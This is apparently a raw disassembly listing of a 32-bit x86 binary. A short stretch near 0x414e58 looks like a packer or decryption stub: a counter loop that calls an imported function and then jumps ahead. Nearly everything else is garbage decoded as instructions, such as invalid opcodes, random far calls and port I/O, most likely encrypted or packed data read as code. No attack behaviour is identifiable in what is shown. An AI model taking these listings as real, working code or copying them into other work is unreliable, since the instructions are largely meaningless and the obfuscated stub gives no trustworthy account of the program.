  414e14:	(bad)  
  414e15:	das    
  414e16:	mul    BYTE PTR ds:0x7240c313
  414e1c:	jae    0x414deb
  414e1e:	shl    DWORD PTR [edi+ebx*1-0x7b],cl
  414e22:	cmp    BYTE PTR [ecx],al
  414e24:	cli    
  414e25:	inc    esi
  414e26:	ret    
  414e27:	cmp    BYTE PTR [eax+esi*1+0x2bb3881],dl
  414e2e:	jae    0x414dbe
  414e30:	add    ebx,eax
  414e32:	stos   DWORD PTR es:[edi],eax
  414e33:	push   es
  414e34:	ins    BYTE PTR es:[edi],dx
  414e35:	xchg   DWORD PTR [esi-0x2f],ebx
  414e38:	inc    edi
  414e39:	sub    BYTE PTR [edx],bh
  414e3b:	dec    edi
  414e3c:	pushf  
  414e3d:	sub    al,0x2a
  414e3f:	xchg   DWORD PTR [edi+0xe],esi
  414e42:	mov    al,0x2d
  414e44:	scas   eax,DWORD PTR es:[edi]
  414e45:	and    al,0x55
  414e47:	inc    ebp
  414e48:	fwait
  414e49:	push   cs
  414e4a:	pop    esi
  414e4b:	pop    ebx
  414e4c:	leave  
  414e4d:	ret    
  414e4e:	push   ebp
  414e4f:	mov    ebp,esp
  414e51:	sub    esp,0x28
  414e54:	leave  
  414e55:	ret    0xc
  414e58:	push   ebp
  414e59:	mov    ebp,esp
  414e5b:	sub    esp,0x44
  414e5e:	and    DWORD PTR ds:0x42a409,0x0
  414e68:	xor    edx,edx
  414e6a:	or     edx,DWORD PTR ds:0x42a409
  414e70:	inc    edx
  414e71:	mov    DWORD PTR ds:0x42a409,edx
  414e77:	cmp    DWORD PTR ds:0x42a409,0x5
  414e7e:	jne    0x414e9e
  414e84:	push   0x4ddc
  414e89:	push   0x2786
  414e8e:	push   0x42a341
  414e93:	push   0x42a371
  414e98:	call   DWORD PTR ds:0x4251dc
  414e9e:	cmp    DWORD PTR ds:0x42a409,0x4
  414ea5:	jne    0x414eb8
  414eab:	mov    edx,DWORD PTR ds:0x42a409
  414eb1:	inc    edx
  414eb2:	mov    DWORD PTR ds:0x42a409,edx
  414eb8:	cmp    DWORD PTR ds:0x42a409,0x12
  414ebf:	jb     0x414e68
  414ec5:	or     eax,eax
  414ec7:	jmp    0x4153d9
  414ecc:	ror    ecx,1
  414ece:	cmp    al,0xcc
  414ed0:	aam    0xd9
  414ed2:	ror    ecx,1
  414ed4:	add    esp,esp
  414ed6:	sub    BYTE PTR [ecx],dh
  414ed8:	icebp  
  414ed9:	mov    esi,0x2f9cae66
  414ede:	jg     0x414f58
  414ee0:	jae    0x414f5e
  414ee2:	js     0x414f5c
  414ee4:	mov    ecx,0x96b4fa12
  414ee9:	scas   eax,DWORD PTR es:[edi]
  414eea:	adc    ah,BYTE PTR [eax-0x5]
  414eed:	mov    al,ds:0xfa2ac6f6
  414ef2:	stos   DWORD PTR es:[edi],eax
  414ef3:	fdivr  QWORD PTR [esi-0x58]
  414ef6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ef7:	in     eax,0x6d
  414ef9:	ins    DWORD PTR es:[edi],dx
  414efa:	cmp    edi,DWORD PTR [edi]
  414efc:	test   DWORD PTR [ecx-0x17],ebx
  414eff:	push   ebp
  414f00:	scas   al,BYTE PTR es:[edi]
  414f01:	inc    eax
  414f02:	dec    esi
  414f03:	retf   
  414f04:	xor    al,0x91
  414f06:	daa    
  414f07:	scas   al,BYTE PTR es:[edi]
  414f08:	mov    eax,0xc1c0f5a7
  414f0d:	xchg   ecx,eax
  414f0e:	repz jbe 0x414f5a
  414f11:	iret   
  414f12:	xor    bh,BYTE PTR [eax-0x468b64d9]
  414f18:	ins    BYTE PTR es:[edi],dx
  414f19:	cmp    DWORD PTR [ecx-0x2fbaa807],edx
  414f1f:	loopne 0x414f90
  414f21:	adc    DWORD PTR [ebx],eax
  414f23:	and    ecx,ebp
  414f25:	push   esi
  414f26:	pop    edx
  414f27:	pop    ss
  414f28:	scas   eax,DWORD PTR es:[edi]
  414f29:	mov    eax,ds:0xdca4e5f4
  414f2e:	inc    esp
  414f2f:	fsub   DWORD PTR [edx+0x54]
  414f32:	fiadd  WORD PTR [ecx+0x53a4d3ce]
  414f38:	push   edx
  414f39:	neg    DWORD PTR ds:0xe2afa6b3
  414f3f:	imul   edi,DWORD PTR [ecx-0x4c],0xffffffb6
  414f43:	rcr    DWORD PTR [edx-0x29],cl
  414f46:	cld    
  414f47:	ins    BYTE PTR es:[edi],dx
  414f48:	sbb    eax,esi
  414f4a:	adc    al,BYTE PTR [ecx]
  414f4c:	push   ecx
  414f4d:	stc    
  414f4e:	sub    esp,DWORD PTR [ebx]
  414f50:	mov    al,ds:0xea037ddd
  414f55:	or     ebp,DWORD PTR [edx+eiz*8+0x6c]
  414f59:	push   ds
  414f5a:	jl     0x414faa
  414f5c:	or     BYTE PTR [ebx],dl
  414f5e:	or     DWORD PTR [ebp-0x63],ecx
  414f61:	fnstenv [edx-0x3]
  414f64:	xchg   DWORD PTR [ebx-0x1973862d],ecx
  414f6a:	xor    eax,0xaefd7022
  414f6f:	add    BYTE PTR [ecx+0x15db4f8],cl
  414f75:	adc    dh,bl
  414f77:	icebp  
  414f78:	cmp    bh,dh
  414f7a:	sar    BYTE PTR [esp+ebp*8+0x1ea5e74f],0x4a
  414f82:	lods   al,BYTE PTR ds:[esi]
  414f83:	dec    ebp
  414f84:	dec    esi
  414f85:	xor    BYTE PTR [edx-0x1],bl
  414f88:	fisttp QWORD PTR [ebp-0x25d80e52]
  414f8e:	inc    esp
  414f8f:	jb     0x414f23
  414f91:	jnp    0x414fd0
  414f93:	out    0x23,eax
  414f95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f96:	push   esi
  414f97:	pop    ecx
  414f98:	into   
  414f99:	sbb    eax,0x1944916b
  414f9e:	jns    0x414faa
  414fa0:	jnp    0x414f66
  414fa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fa3:	xchg   edx,eax
  414fa4:	into   
  414fa5:	sbb    ch,BYTE PTR [edi]
  414fa7:	call   0xd674c3b9
  414fac:	sti    
  414fad:	xchg   ebp,eax
  414fae:	stos   DWORD PTR es:[edi],eax
  414faf:	ret    
  414fb0:	stos   BYTE PTR es:[edi],al
  414fb1:	adc    BYTE PTR [edi+0x1af00396],dl
  414fb7:	or     al,0x43
  414fb9:	push   ds
  414fba:	pop    esp
  414fbb:	lahf   
  414fbc:	or     al,BYTE PTR [edx]
  414fbe:	ins    BYTE PTR es:[edi],dx
  414fbf:	push   es
  414fc0:	or     eax,0xc67d5228
  414fc5:	cmp    DWORD PTR [eax+0x73efbfba],esi
  414fcb:	or     eax,0x71c5d3e3
  414fd0:	or     ch,BYTE PTR [ebp-0x37]
  414fd3:	imul   eax,DWORD PTR [edi],0xf1cd7b5
  414fd9:	or     eax,0xb50985bc
  414fde:	adc    esp,DWORD PTR [esi+edi*4]
  414fe1:	pop    edx
  414fe2:	pcmpgtb mm3,QWORD PTR [ebp-0x15790070]
  414fe9:	pop    edi
  414fea:	jle    0x415000
  414fec:	data16 sti 
  414fee:	retf   0xc756
  414ff1:	fidivr DWORD PTR [ebx+0x38f6869c]
  414ff7:	stos   BYTE PTR es:[edi],al
  414ff8:	bound  esp,QWORD PTR [edi]
  414ffa:	(bad)  [eax]
  414ffc:	outs   dx,BYTE PTR ds:[esi]
  414ffd:	fsubr  st(7),st
  414fff:	loope  0x415043
  415001:	xor    BYTE PTR [esi-0x7bd73a99],0xfb
  415008:	(bad)  [edx-0x2c]
  41500b:	jae    0x41505d
  41500d:	add    dl,BYTE PTR [esp+ebp*1+0x7b]
  415011:	mov    dl,bl
  415013:	sbb    DWORD PTR [edi+0x7c],eax
  415016:	push   eax
  415017:	xor    BYTE PTR [edx-0x3d],0x6e
  41501b:	dec    ecx
  41501c:	dec    edx
  41501d:	mov    cl,0xfa
  41501f:	scas   al,BYTE PTR es:[edi]
  415020:	sti    
  415021:	pop    esi
  415022:	adc    al,0xe4
  415024:	lds    esp,FWORD PTR [ebp-0xf]
  415027:	ret    0x807e
  41502a:	sbb    al,0x73
  41502c:	fld    TBYTE PTR [esi-0x30]
  41502f:	xchg   edi,eax
  415030:	inc    esi
  415031:	inc    edi
  415032:	jg     0x415075
  415034:	stc    
  415035:	es ds (bad) 
  415038:	push   ecx
  415039:	call   0xbbf3:0x1d7f4d33
  415040:	adc    al,0x62
  415042:	adc    eax,0x3195f48
  415047:	sub    bh,BYTE PTR ss:[ebx+0x52b5b386]
  41504e:	adc    al,0xc9
  415050:	cmp    dl,0xa
  415053:	push   ebx
  415054:	retf   
  415055:	jno    0x4150bf
  415057:	adc    DWORD PTR [eax-0x5eef79b0],ebp
  41505d:	mov    dh,0xb5
  41505f:	mov    eax,ds:0x69abbba
  415064:	inc    ecx
  415065:	(bad)  
  415066:	hlt    
  415067:	call   0x588a:0x9c2c6df7
  41506e:	xor    esp,DWORD PTR [ecx+0x1178e065]
  415074:	repz fwait
  415076:	call   0x4b61:0xf8684f29
  41507d:	add    al,0x21
  41507f:	xor    edx,ecx
  415081:	(bad)  
  415082:	cdq    
  415083:	call   0x32f2:0xeb746733
  41508a:	rcr    edi,1
  41508c:	mov    ebp,0xd81d5a5e
  415091:	push   0x67690e3d
  415096:	jle    0x4150c5
  415098:	mov    al,ds:0xdd167cb0
  41509d:	fmul   QWORD PTR [eax+0x3a]
  4150a0:	loop   0x4150a8
  4150a2:	rol    DWORD PTR [ebp-0x37],0x8a
  4150a6:	mov    esp,0x44b9f9f9
  4150ab:	into   
  4150ac:	sti    
  4150ad:	sub    bh,BYTE PTR [ecx-0x53]
  4150b0:	xor    DWORD PTR [edi-0x49948b83],0x8967dd1b
  4150ba:	sbb    dl,BYTE PTR [esi+ebx*8-0x5f]
  4150be:	push   ebx
  4150bf:	mov    eax,ds:0x421d190f
  4150c4:	test   ax,0x8aaa
  4150c8:	popf   
  4150c9:	inc    ebx
  4150ca:	jb     0x41506b
  4150cc:	call   0x12534d28
  4150d1:	jl     0x4150ba
  4150d3:	sub    al,ah
  4150d5:	xlat   BYTE PTR ds:[ebx]
  4150d6:	xchg   DWORD PTR [edx+eax*8],edi
  4150d9:	fld    TBYTE PTR [esi]
  4150db:	sub    DWORD PTR [eax],esp
  4150dd:	int3   
  4150de:	push   0x6c09cd18
  4150e3:	test   al,0xd0
  4150e5:	psadbw mm3,QWORD PTR [edx-0x7765d99c]
  4150ec:	sbb    DWORD PTR [ebx+0x13],esi
  4150ef:	mov    bl,0xb8
  4150f1:	in     al,dx
  4150f2:	mov    ds:0xa524344,al
  4150f7:	pop    ebp
  4150f8:	lock dec ebx
  4150fa:	mov    BYTE PTR [esi-0x37340986],bh
  415100:	push   eax
  415101:	fsubrp st(5),st
  415103:	xlat   BYTE PTR ds:[ebx]
  415104:	mov    esp,0x55743267
  415109:	jne    0x4150e8
  41510b:	ffreep st(2)
  41510d:	jne    0x415136
  41510f:	mov    dh,0x92
  415111:	fistp  QWORD PTR [ebp+0x37]
  415114:	fcmovnb st,st(6)
  415116:	xchg   DWORD PTR [ebp-0x4c],edi
  415119:	aad    0xfc
  41511b:	mov    ds:0x4615698c,al
  415120:	fimul  DWORD PTR [eax+ebx*8]
  415123:	xchg   edx,eax
  415124:	ror    BYTE PTR [edx],1
  415126:	xor    eax,0xe7debac
  41512b:	mov    WORD PTR [ecx+0x77],gs
  41512e:	leave  
  41512f:	ret    0xeac8
  415132:	inc    ecx
  415133:	fbld   TBYTE PTR ds:0x1ce268a
  415139:	push   edi
  41513a:	or     al,0x97
  41513c:	ins    DWORD PTR es:[edi],dx
  41513d:	cmp    al,0x3e
  41513f:	inc    ebp
  415140:	out    0x23,al
  415142:	in     al,dx
  415143:	test   al,0xc8
  415145:	and    edx,DWORD PTR [edi*8+0x34b57ca]
  41514c:	gs pop ebp
  41514e:	add    bl,BYTE PTR [ecx+0x7d74232b]
  415154:	sar    BYTE PTR [edx],0xb9
  415157:	and    al,0x5d
  415159:	inc    edx
  41515a:	sbb    al,0x87
  41515c:	(bad)  
  41515d:	add    eax,0x73fb0293
  415162:	pusha  
  415163:	lods   al,BYTE PTR ds:[esi]
  415164:	push   cs
  415165:	and    eax,0xc1d363bd
  41516a:	sub    DWORD PTR [eax-0x4],ecx
  41516d:	(bad)  
  41516e:	call   0x27ea:0x5afe0f10
  415175:	mov    ch,0x78
  415177:	push   esi
  415178:	cmp    DWORD PTR [edi-0x7b],ecx
  41517b:	repz dec ebp
  41517d:	and    eax,0x8d0aa0eb
  415182:	sbb    ebp,DWORD PTR [edx+0x43]
  415185:	cmc    
  415186:	cmp    eax,0x3bc5f1ea
  41518b:	add    bl,BYTE PTR [eax+eax*8]
  41518e:	loope  0x41517d
  415190:	std    
  415191:	sub    BYTE PTR [edx-0x64],dl
  415194:	jl     0x4151ea
  415196:	inc    ebx
  415197:	jmp    0x36f9fe70
  41519c:	leave  
  41519d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41519e:	adc    al,0xf8
  4151a1:	out    0x6,eax
  4151a3:	push   esi
  4151a4:	adc    dl,BYTE PTR [esi+ecx*2-0x1a]
  4151a8:	je     0x4151fe
  4151aa:	out    dx,eax
  4151ab:	xor    eax,0x28a6b08c
  4151b0:	hlt    
  4151b1:	mov    ah,0x17
  4151b3:	icebp  
  4151b4:	inc    esp
  4151b5:	push   esi
  4151b6:	int3   
  4151b7:	test   eax,0xdcb44afd
  4151bc:	imul   ebp,DWORD PTR [ebx+0x17],0x3469dd7f
  4151c3:	sbb    BYTE PTR [ebp-0x2b7bce25],ch
  4151c9:	pop    edi
  4151ca:	loope  0x415202
  4151cc:	push   edx
  4151cd:	inc    ecx
  4151ce:	test   al,0x7a
  4151d0:	pop    ebp
  4151d1:	mov    eax,ds:0xd1260e8
  4151d6:	stos   BYTE PTR es:[edi],al
  4151d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151d8:	cmp    BYTE PTR [ebx],ch
  4151da:	shl    BYTE PTR [edi+0x12],cl
  4151dd:	test   al,0x20
  4151df:	aam    0x8b
  4151e1:	pop    ebx
  4151e2:	aas    
  4151e3:	outs   dx,DWORD PTR ds:[esi]
  4151e4:	inc    DWORD PTR [eax+0x7f]
  4151e7:	xchg   edx,eax
  4151e8:	cmp    al,0x6a
  4151ea:	xchg   ecx,eax
  4151eb:	xchg   edx,eax
  4151ec:	hlt    
  4151ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151ee:	in     al,dx
  4151ef:	call   0x55a86727
  4151f4:	int3   
  4151f5:	popf   
  4151f6:	into   
  4151f7:	or     bh,BYTE PTR [edi+0x18]
  4151fa:	push   esp
  4151fb:	leave  
  4151fc:	ror    DWORD PTR [ebp-0xe479352],cl
  415202:	sub    eax,0xc6e5356a
  415207:	test   bh,bl
  415209:	into   
  41520a:	pop    ebp
  41520b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41520c:	sbb    ebp,eax
  41520e:	lods   al,BYTE PTR ds:[esi]
  41520f:	inc    ecx
  415210:	pop    ss
  415211:	xchg   esi,eax
  415212:	(bad)  
  415213:	or     ah,ah
  415215:	mov    esi,0x3415c4e4
  41521a:	inc    ecx
  41521b:	in     eax,0x2
  41521d:	das    
  41521e:	mov    dh,0x1e
  415220:	mov    ebp,0xcab24cca
  415225:	popa   
  415226:	je     0x415243
  415228:	jne    0x4151e2
  41522a:	jno    0x4151fc
  41522c:	pop    ecx
  41522d:	sub    ah,BYTE PTR [ebp-0x53]
  415230:	stos   BYTE PTR es:[edi],al
  415231:	cld    
  415232:	stc    
  415233:	mov    edx,0x57fb5cd8
  415238:	xor    esi,eax
  41523a:	xor    DWORD PTR [esi+0x397ff955],esp
  415240:	test   al,0x6b
  415242:	sub    ecx,DWORD PTR [ecx-0x798b64f2]
  415248:	mov    al,0xfc
  41524a:	dec    eax
  41524b:	jae    0x415224
  41524d:	sub    BYTE PTR [esi-0x74],ch
  415250:	mov    edx,0x62f219fa
  415255:	test   al,0x1b
  415257:	fstp   st(3)
  415259:	(bad)  
  41525a:	outs   dx,BYTE PTR ds:[esi]
  41525b:	pop    esp
  41525c:	mov    edx,0xdf4150a2
  415261:	stc    
  415262:	jmp    0x93608916
  415267:	jne    0x4152af
  415269:	push   esi
  41526a:	jns    0x4152ce
  41526c:	sub    bl,dh
  41526e:	scas   eax,DWORD PTR es:[edi]
  41526f:	mov    ch,0xd0
  415271:	mov    esp,0x1e9b7ab9
  415276:	popa   
  415277:	imul   ebx,DWORD PTR [esi+0x29d05eab],0x597c8072
  415281:	in     al,0xae
  415283:	std    
  415284:	sbb    DWORD PTR [esi-0x7e],eax
  415287:	mov    esi,0x7283aa44
  41528c:	sub    DWORD PTR [ebp+0x3cf5009e],ebx
  415292:	xor    esi,DWORD PTR [esi-0x60]
  415295:	out    0x58,eax
  415297:	ja     0x41521b
  415299:	and    DWORD PTR ds:0x3829b581,esi
  41529f:	cli    
  4152a0:	stos   BYTE PTR es:[edi],al
  4152a1:	pop    ecx
  4152a2:	xchg   esp,eax
  4152a3:	mov    BYTE PTR [bp+si-0x263d],bh
  4152a8:	lahf   
  4152a9:	jnp    0x41523b
  4152ab:	repnz mov ecx,0x101755d4
  4152b1:	push   esp
  4152b2:	and    dl,BYTE PTR [esp+ecx*8]
  4152b5:	shr    DWORD PTR [ecx-0x3793c561],cl
  4152bb:	stos   BYTE PTR es:[edi],al
  4152bc:	leave  
  4152bd:	loop   0x4152e4
  4152bf:	lds    ebp,FWORD PTR ds:0x8ed9f48c
  4152c5:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4152c7:	outs   dx,DWORD PTR ds:[esi]
  4152c8:	add    dh,0x3a
  4152cb:	jne    0x415332
  4152cd:	push   cs
  4152ce:	sub    eax,0xe2ce239e
  4152d3:	popf   
  4152d4:	xlat   BYTE PTR ds:[ebx]
  4152d5:	add    al,0x71
  4152d7:	jg     0x415283
  4152d9:	(bad)  
  4152da:	(bad)  
  4152db:	xchg   DWORD PTR [esi],edi
  4152dd:	jnp    0x4152b7
  4152df:	out    dx,al
  4152e0:	xor    edi,DWORD PTR [ecx+0x34]
  4152e3:	mov    ch,0x7e
  4152e5:	push   edx
  4152e6:	addr16 adc al,0x98
  4152e9:	test   eax,0xc8ab4d61
  4152ee:	jnp    0x41532b
  4152f0:	rcl    BYTE PTR [esi],cl
  4152f2:	add    BYTE PTR [eax-0x258ee68c],dh
  4152f8:	push   ebp
  4152f9:	fnstcw WORD PTR [esi-0x31055e54]
  4152ff:	and    al,0xe7
  415301:	mov    bl,0xf1
  415303:	jmp    0xa582:0xa3eb72e9
  41530a:	scas   al,BYTE PTR es:[edi]
  41530b:	dec    eax
  41530c:	push   0x3a
  41530e:	test   BYTE PTR [edx+0x5958cc0d],ah
  415314:	push   ds
  415315:	push   edx
  415316:	jnp    0x415353
  415318:	xor    BYTE PTR [esi],dh
  41531a:	and    DWORD PTR [ebx],edx
  41531c:	out    0xba,al
  41531e:	inc    ebp
  41531f:	pop    es
  415320:	ss pop edx
  415322:	mov    ds:0x64750d89,al
  415327:	sub    ecx,DWORD PTR [eax]
  415329:	cmc    
  41532a:	test   eax,0x3230b48a
  41532f:	pop    edx
  415330:	mov    esi,0x48d8c601
  415335:	mov    ch,0xe1
  415337:	pusha  
  415338:	jle    0x415398
  41533a:	ret    
  41533b:	jo     0x4152c1
  41533d:	jne    0x4152db
  41533f:	fcom   QWORD PTR [ecx+0x13]
  415342:	nop
  415343:	xor    edx,esp
  415345:	jbe    0x41533d
  415347:	(bad)  
  415348:	in     eax,dx
  415349:	xchg   esp,eax
  41534a:	loop   0x415376
  41534c:	sub    al,0xb2
  41534e:	mov    ?,eax
  415350:	cmp    BYTE PTR [ecx+eax*4],ah
  415353:	or     dl,BYTE PTR [edx-0x9c78717]
  415359:	scas   eax,DWORD PTR es:[edi]
  41535a:	xor    eax,0x5e40d685
  41535f:	mov    DWORD PTR [ebx+0x5],0x45323fc0
  415366:	scas   al,BYTE PTR es:[edi]
  415367:	sbb    BYTE PTR [edi-0x6fb43a1d],bl
  41536d:	es sti 
  41536f:	nop
  415370:	stos   DWORD PTR es:[edi],eax
  415371:	add    ebp,edx
  415373:	sbb    esi,DWORD PTR [eax+0x6b0ac0d1]
  415379:	sbb    BYTE PTR [esi-0x7f0e1c45],cl
  41537f:	inc    edx
  415380:	inc    esi
  415381:	lock and al,dh
  415384:	mov    bl,0x7e
  415386:	push   ecx
  415387:	xchg   edx,eax
  415388:	or     eax,0x8ebd18a5
  41538d:	call   0xe2894849
  415392:	scas   eax,DWORD PTR es:[edi]
  415393:	mov    esi,0x3cfb027e
  415398:	jle    0x415337
  41539a:	add    ecx,edx
  41539c:	mov    esi,0x391e2c10
  4153a1:	out    dx,eax
  4153a2:	pop    edi
  4153a3:	and    DWORD PTR [esi-0x403a667d],ebx
  4153a9:	nop
  4153aa:	xor    DWORD PTR [edi],ebp
  4153ac:	int3   
  4153ad:	popf   
  4153ae:	js     0x4153bf
  4153b0:	jl     0x4153a2
  4153b2:	je     0x415362
  4153b4:	jg     0x4153f0
  4153b6:	add    al,0xbc
  4153b8:	ins    DWORD PTR es:[edi],dx
  4153b9:	ret    
  4153ba:	neg    BYTE PTR [eax+0x7e]
  4153bd:	and    al,0x75
  4153bf:	hlt    
  4153c0:	sbb    ecx,eax
  4153c2:	push   esp
  4153c3:	ins    BYTE PTR es:[edi],dx
  4153c4:	dec    edi
  4153c5:	pushf  
  4153c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153c7:	bnd ja 0x41542b
  4153ca:	jg     0x41539b
  4153cc:	addr16 or eax,0x5d22c319
  4153d2:	fdivp  st(2),st
  4153d4:	cli    
  4153d5:	mov    WORD PTR [ecx-0x10],cs
  4153d8:	lods   al,BYTE PTR ds:[esi]
  4153d9:	push   edi
  4153da:	jmp    0x4158ec
  4153df:	ret    0xd7c7
  4153e2:	rcr    ecx,0xd1
  4153e5:	fcmovb st,st(7)
  4153e7:	jp     0x4153c9
  4153e9:	outs   dx,BYTE PTR ds:[esi]
  4153ea:	and    DWORD PTR [esi+0x43],0x73
  4153ee:	seta   BYTE PTR [edx]
  4153f1:	jg     0x41546b
  4153f3:	jae    0x415471
  4153f5:	js     0x41546f
  4153f7:	push   ss
  4153f8:	push   ds
  4153f9:	and    cl,al
  4153fb:	xor    DWORD PTR [esp+edi*1+0x3cfacfc1],0x11
  415403:	adc    DWORD PTR [edi],ebx
  415405:	loop   0x415438
  415407:	fiadd  DWORD PTR [ecx+edi*1]
  41540a:	jecxz  0x415418
  41540c:	add    dh,BYTE PTR [edx+0x3a]
  41540f:	daa    
  415410:	sti    
  415411:	imul   edx,DWORD PTR [eax+eax*4+0x2948e05b],0x3ea16ec6
  41541c:	jne    0x4153a4
  41541e:	data16 mov BYTE PTR [edi+0x1],bl
  415422:	adc    DWORD PTR [ebx+eiz*1-0x4a],ecx
  415426:	loope  0x4154a0
  415428:	jmp    0x4153f8
  41542a:	mov    ah,BYTE PTR [eax+edi*4]
  41542d:	sub    edx,DWORD PTR [edx-0x25]
  415430:	outs   dx,DWORD PTR ds:[esi]
  415431:	stos   DWORD PTR es:[edi],eax
  415432:	sbb    DWORD PTR [ecx+0xefd9ce4],ebx
  415438:	test   al,0xd7
  41543a:	mov    al,0xe5
  41543c:	xor    ah,BYTE PTR [ecx]
  41543e:	mov    DWORD PTR [eax-0x3811f195],ebx
  415444:	xchg   edx,eax
  415445:	test   al,0x7e
  415447:	mul    BYTE PTR [edx-0x6142245b]
  41544d:	xchg   esp,eax
  41544e:	and    cl,BYTE PTR [ebp-0x26]
  415451:	sahf   
  415452:	aam    0x4b
  415454:	sti    
  415455:	fidiv  WORD PTR [ebx+0x17]
  415458:	mov    cs,WORD PTR [eax-0xe]
  41545b:	cwde   
  41545c:	repnz leave 
  41545e:	jb     0x415411
  415460:	xlat   BYTE PTR ds:[ebx]
  415461:	xor    eax,esi
  415463:	push   esi
  415464:	not    DWORD PTR [ecx]
  415466:	add    eax,0x14d83e15
  41546b:	jae    0x4154a3
  41546d:	(bad)  
  41546e:	repz ret 
  415470:	(bad)  
  415471:	mov    eax,0x234558b2
  415476:	mov    edx,0xe9c75ac9
  41547b:	iret   
  41547c:	popf   
  41547d:	ror    cl,cl
  41547f:	dec    esi
  415480:	pop    ecx
  415481:	inc    ecx
  415482:	jg     0x415451
  415484:	bound  eax,QWORD PTR [ebp+ebp*4-0x222255a5]
  41548b:	ins    DWORD PTR es:[edi],dx
  41548c:	gs inc esi
  41548e:	shl    DWORD PTR [ecx+0x64e8128],1
  415494:	lds    ebx,FWORD PTR [ebp+0x510ff440]
  41549a:	stos   DWORD PTR es:[edi],eax
  41549b:	inc    ebp
  41549c:	mov    DWORD PTR [esi],ecx
  41549e:	push   eax
  41549f:	ret    0xe5c6
  4154a2:	mov    eax,0xd4e1e06b
  4154a7:	bound  ebp,QWORD PTR [edi-0x37]
  4154aa:	xcrypt-cfb (bad)
  4154ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154ac:	in     eax,0xe8
  4154ae:	imul   ebp,DWORD PTR [esi],0xe761b719
  4154b4:	and    eax,0x48c01d47
  4154b9:	xchg   esp,eax
  4154ba:	sub    eax,DWORD PTR [edx-0x2d]
  4154bd:	(bad)  
  4154be:	rcr    BYTE PTR [eax+0x54],1
  4154c1:	mov    al,ds:0xee5d8a9b
  4154c6:	jmp    0x415499
  4154c8:	pop    ss
  4154c9:	pop    edx
  4154ca:	mov    bh,ch
  4154cc:	out    dx,eax
  4154cd:	cmp    BYTE PTR [eax],ah
  4154cf:	push   esp
  4154d0:	and    al,0x30
  4154d2:	ds in  al,dx
  4154d4:	mov    bh,0x4a
  4154d6:	jmp    0x2223f4ee
  4154db:	lahf   
  4154dc:	cmp    ah,BYTE PTR ds:0xe10c7aaa
  4154e2:	sub    al,0xbd
  4154e4:	rcr    DWORD PTR [ebx-0x39e0655],1
  4154ea:	and    ebx,ebp
  4154ec:	sub    eax,DWORD PTR [ebx]
  4154ee:	jp     0x415501
  4154f0:	xchg   edx,eax
  4154f1:	push   ds
  4154f2:	retf   0x3237
  4154f5:	jne    0x4154ae
  4154f7:	and    DWORD PTR [esi+0x79],0x36f88358
  4154fe:	add    al,0x31
  415500:	mov    esp,0x96f76483
  415505:	mov    dl,0xe3
  415507:	cmp    edx,DWORD PTR [eax+0x53]
  41550a:	mov    al,ds:0x160215ee
  41550f:	jl     0x4154b7
  415511:	std    
  415512:	out    0x7d,eax
  415514:	jecxz  0x4154d2
  415516:	pop    ds
  415517:	mov    eax,ds:0xad174e5
  41551c:	push   ebx
  41551d:	jmp    DWORD PTR [ebp-0x74f12dc8]
  415523:	and    ecx,DWORD PTR [edx+0x358d1102]
  415529:	xor    BYTE PTR [eax+0x72],al
  41552c:	push   ecx
  41552d:	lds    ecx,FWORD PTR [esi+0x20]
  415530:	nop
  415531:	shr    DWORD PTR [eax],1
  415533:	push   eax
  415534:	xchg   ebp,eax
  415535:	xor    DWORD PTR [edx+esi*4],ebp
  415538:	mov    edi,0x2980be55
  41553d:	ins    BYTE PTR es:[edi],dx
  41553e:	test   eax,0xc9d5a828
  415543:	or     dl,dh
  415545:	dec    edi
  415546:	mov    eax,0x5fa06310
  41554b:	cmp    ch,BYTE PTR [esi]
  41554d:	jmp    0x41552e
  41554f:	ja     0x4155b2
  415551:	ror    DWORD PTR [ebp-0x56b3093f],0x2d
  415558:	fs aad 0x6a
  41555b:	sub    edi,DWORD PTR [edi+0x1c]
  41555e:	mov    ecx,DWORD PTR [eax+0x75]
  415561:	pop    ds
  415562:	les    ebp,FWORD PTR [edx]
  415564:	add    DWORD PTR [ebp-0x47],edx
  415567:	lahf   
  415568:	out    dx,eax
  415569:	mov    cl,0x30
  41556b:	add    esi,esp
  41556d:	sub    esp,DWORD PTR [esp]
  415570:	mov    ebx,0xafbb3e34
  415575:	pop    esp
  415576:	sub    eax,0x9121f818
  41557b:	fisubr WORD PTR [edi]
  41557d:	lds    edi,FWORD PTR [esi+0x59]
  415580:	out    dx,eax
  415581:	loopne 0x415507
  415583:	dec    edi
  415584:	popa   
  415585:	ret    0x5fad
  415588:	hlt    
  415589:	adc    al,0x2
  41558b:	mov    al,ds:0x3226387d
  415590:	jns    0x41554a
  415592:	in     al,0x95
  415594:	inc    esp
  415595:	xchg   ecx,eax
  415596:	add    cl,BYTE PTR [edi+0x50]
  415599:	jo     0x415588
  41559b:	mov    edx,edx
  41559d:	mov    ah,0x32
  41559f:	fcomp  QWORD PTR [ebx]
  4155a1:	or     al,0xed
  4155a3:	addr16 loop 0x41557c
  4155a6:	aas    
  4155a7:	dec    esp
  4155a8:	jg     0x4155b1
  4155aa:	shl    BYTE PTR [ebp+0xb375014],cl
  4155b0:	jle    0x415630
  4155b2:	std    
  4155b3:	ss test ch,bh
  4155b6:	lock or al,0xb8
  4155b9:	clc    
  4155ba:	and    bh,al
  4155bc:	icebp  
  4155bd:	jmp    0x808b:0xc8f738e9
  4155c4:	dec    eax
  4155c5:	push   ss
  4155c6:	inc    ecx
  4155c7:	scas   al,BYTE PTR es:[edi]
  4155c8:	std    
  4155c9:	icebp  
  4155ca:	add    BYTE PTR [ebx],dl
  4155cc:	retf   
  4155cd:	js     0x415588
  4155cf:	jecxz  0x415572
  4155d1:	jne    0x4155f7
  4155d3:	dec    ebx
  4155d4:	sbb    eax,0x4664a48
  4155d9:	popf   
  4155da:	sbb    DWORD PTR [edx],ebx
  4155dc:	push   ss
  4155dd:	lock test BYTE PTR ss:[ecx],0x99
  4155e2:	pop    ds
  4155e3:	cmp    al,0xfa
  4155e5:	(bad)  
  4155e6:	and    eax,0xe57b91b2
